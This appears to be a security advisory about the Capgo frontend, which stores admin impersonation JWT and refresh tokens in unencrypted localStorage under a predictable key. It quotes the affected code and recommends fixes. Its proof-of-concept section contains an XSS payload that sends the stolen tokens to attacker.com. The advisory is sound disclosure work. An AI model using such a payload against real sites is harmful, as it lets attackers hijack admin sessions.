# Security Advisory: Admin Spoof JWT Stored in Unencrypted localStorage

## Summary (AI generated)

The admin impersonation ("spoof") feature stores JWT access tokens and refresh tokens in the browser's `localStorage` without encryption, making them extractable via XSS attacks.

## Severity

**Low** — CVSS 3.7 (AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N)

## Affected Component

- **File:** `src/services/supabase.ts`
- **Lines:** 88–124
- **Code:**
  ```typescript
  export function isSpoofed() {
    return !!localStorage.getItem(`supabase-${config.supbaseId}.spoof_admin_jwt`)
  }

  export function saveSpoof(jwt: string, refreshToken: string) {
    return localStorage.setItem(
      `supabase-${config.supbaseId}.spoof_admin_jwt`,
      JSON.stringify({ jwt, refreshToken })
    )
  }

  export function unspoofUser() {
    const textData: string | null = localStorage.getItem(
      `supabase-${config.supbaseId}.spoof_admin_jwt`
    )
    if (!textData || !isSpoofed()) return false
    const { jwt, refreshToken } = JSON.parse(textData)
    // ... sets session with stored tokens
  }
  ```

## Description

When an admin uses the "log as user" (spoof) feature, the admin's own JWT and refresh token are saved in `localStorage` under a predictable key name (`supabase-{id}.spoof_admin_jwt`). This allows:

1. Any JavaScript running on the page (including XSS payloads) to read the admin JWT
2. The key name is predictable and well-known (visible in open source code)
3. The stored tokens include both `jwt` (access token) and `refreshToken`, giving full session capability
4. `localStorage` has no expiration mechanism — tokens persist until explicitly removed

## Proof of Concept

### Code Review Evidence

```bash
$ grep -n "localStorage.*jwt\|localStorage.*token\|localStorage.*spoof" src/services/supabase.ts
89:  return !!localStorage.getItem(`supabase-${config.supbaseId}.spoof_admin_jwt`)
92:  return localStorage.setItem(`supabase-${config.supbaseId}.spoof_admin_jwt`, JSON.stringify({ jwt, refreshToken }))
106:  return localStorage.removeItem(`sb-${config.supbaseId}-auth-token`)
109:  return localStorage.getItem(`sb-${config.supbaseId}-auth-token`)
112:  const textData: string | null = localStorage.getItem(`supabase-${config.supbaseId}.spoof_admin_jwt`)
122:  localStorage.removeItem(`supabase-${config.supbaseId}.spoof_admin_jwt`)
```

An XSS payload could extract the admin JWT with:
```javascript
// Attacker's XSS payload
const keys = Object.keys(localStorage).filter(k => k.includes('spoof_admin_jwt'));
keys.forEach(k => fetch('https://attacker.com/steal?token=' + localStorage.getItem(k)));
```

## Impact

- If an XSS vulnerability exists anywhere in the Capgo frontend, admin JWT tokens stored during spoof sessions can be stolen
- The stolen JWT gives the attacker a valid admin session
- The refresh token allows the attacker to maintain access beyond the JWT expiry
- Admin accounts have the highest privilege level, enabling full platform compromise
- Note: This requires a separate XSS vulnerability to exploit, which reduces the direct severity

## Recommended Fix

1. Use `sessionStorage` instead of `localStorage` (cleared when tab closes)
2. Encrypt the stored tokens with a key derived from the session
3. Implement a server-side spoof session that doesn't require client-side token storage
4. Add a short TTL to the spoof session (e.g., 15 minutes)

## References

- [OWASP: HTML5 Security - Local Storage](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage)
- [CWE-922: Insecure Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/922.html)
